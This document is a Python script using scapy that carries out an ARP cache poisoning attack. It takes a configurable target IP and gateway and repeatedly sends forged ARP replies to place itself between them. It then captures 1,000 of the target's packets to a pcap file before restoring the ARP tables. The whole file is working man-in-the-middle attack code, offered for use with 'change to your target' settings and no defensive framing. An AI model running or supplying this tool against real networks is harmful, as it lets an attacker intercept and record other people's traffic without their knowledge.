from scapy.all import ARP, Ether, srp, sniff, wrpcap, conf, sendp
import os
import signal
import sys
import threading
import time 

# ======= Configuration =======
interface = 'eth0'  # Change this if needed (like wlan0)
target_ip = '192.168.1.180'  # Change to your target
gateway_ip = '192.168.1.1'  # Change to your gateway
packet_count = 1000

conf.iface = interface
conf.verb = 0

print("[*] Setting up interface %s..." % interface)


# ======= Restore ARP Tables =======
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring network...")
    ether = Ether(dst=target_mac)
    sendp(ether / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=gateway_mac), count=5, iface=interface)

    ether = Ether(dst=gateway_mac)
    sendp(ether / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=target_mac), count=5, iface=interface)

    os.kill(os.getpid(), signal.SIGINT)



# ======= Get MAC Address =======
def get_mac(ip_address):
    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=5, verbose=False)
    for _, rcv in answered:
        return rcv[Ether].src
    return None


# ======= Poison Target ARP Cache =======
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    ether_to_target = Ether(dst=target_mac)
    poison_target = ether_to_target / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)

    ether_to_gateway = Ether(dst=gateway_mac)
    poison_gateway = ether_to_gateway / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    print("[*] Starting ARP poisoning... [Press CTRL+C to stop]")
    try:
        while True:
            sendp(poison_target, iface=interface, verbose=False)
            sendp(poison_gateway, iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)



# ======= Main =======
gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Failed to get gateway MAC address.")
    sys.exit(1)
else:
    print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Failed to get target MAC address.")
    sys.exit(1)
else:
    print("[*] Target %s is at %s" % (target_ip, target_mac))

# Start poisoning thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

# Start sniffing
try:
    print("[*] Sniffing packets... (count: %d)" % packet_count)
    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    wrpcap("arper.pcap", packets)
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
